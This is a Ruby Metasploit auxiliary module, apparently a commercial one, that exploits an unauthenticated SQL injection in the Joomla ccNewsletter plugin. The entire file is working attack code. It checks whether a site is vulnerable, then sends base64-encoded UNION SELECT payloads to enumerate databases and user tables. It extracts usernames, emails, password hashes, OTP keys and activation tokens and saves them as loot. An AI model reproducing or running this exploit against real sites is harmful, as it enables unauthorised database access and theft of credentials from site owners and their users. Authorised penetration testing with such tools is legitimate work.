##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla ccNewsletter SQL Injection',
      'Description'    => %q{
    This module exploits instances of Joomla with vulnerable ccNewsletter installed to enumerate usernames and password hashes.

    The ccNewsletter Joomla plugin below version 2.2.0 suffered from an unauthenticated
    SQL injection vulnerability. The ccNewletter plugin is a popular plugin used to manage
    newsletters within the Joomla CMS. This module exploits the SQL injection in order
    to enumerate Joomla usernames and password hashes in database.

    Categories: Open Source, Joomla

    Price: 4

    Video: https://asciinema.org/a/9LkuRoes6I8GKoCbC2Nwz5jXx

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
         OptString.new("TARGETURI", [true, 'The relative URI', '/']),
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/index.php?option=com_ccnewsletter&task=viewNewsletter&id=MSc6OzA=&Itemid=103')
    })

    if res.code == 500 and res.body =~ /error in your SQL syntax/
      return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    dbs = []
    users = []

    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    get_db_count = "UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA"

    res = make_injected_request(get_db_count)

    db_count = $1.to_i if res.body =~ /#{left_marker}(.*?)#{right_marker}/

    0.upto(db_count - 1) do |i|
      get_db = "UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"

      res = make_injected_request(get_db)
      dbs << $1 if res.body =~ /#{left_marker}(.*?)#{right_marker}/
    end

    dbs.delete('mysql')
    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('sys')

    dbs.each do |db|
      get_table_count = "UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})"
      res = make_injected_request(get_table_count)

      table_count = $1.to_i if res.body =~ /#{left_marker}(.*?)#{right_marker}/

      tables = []
      0.upto(table_count - 1) do |i|
        get_table = "UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"

        res = make_injected_request(get_table)

        table = $1 if res.body =~ /#{left_marker}(.*?)#{right_marker}/

        tables << table if table =~ /_users$/
      end
      tables.each do |t|
        cols = ['id','name', 'otep', 'email', 'block', 'otpKey','params','username','password','sendEmail','activation','resetCount','registerDate', 'requireReset', 'lastResetTime', 'lastvisitDate']

        get_user_count = "UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{db}.#{t}"

        res = make_injected_request(get_user_count)

        user_count = $1.to_i if res.body =~ /#{left_marker}(.*?)#{right_marker}/

        0.upto(user_count - 1) do |i|
          get_user = "UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},"

          cols.each do |col|
            get_user << "IFNULL(CAST(#{col} AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},"
          end

          get_user = get_user.chomp(',')
          get_user << "),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{db}.#{t}"

          res = make_injected_request(get_user)

          regex = "#{left_marker}(.*?)"
          cols.each do
            regex << "#{right_marker}(.*?)"
          end

          regex.chomp!("(.*?)")

          matches = /#{regex}/.match(res.body)

          matches = matches.to_a.drop(1)
          user = {}
          matches.each_with_index do |m, j|
            user[cols[j]] = m
          end
          users << user
        end
      end
    end

    path = store_loot("joomla.users", "text/plain", datastore['RHOST'], users.to_json, 'joomla.users')

    print_good("Users stored in file: " + path)
  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_ccnewsletter',
        'task' => 'viewNewsletter',
        'id' => Rex::Text.encode_base64('-1337 ' + sql + ":;0"),
        'Itemid' => '103'
      }
    })
  end
end

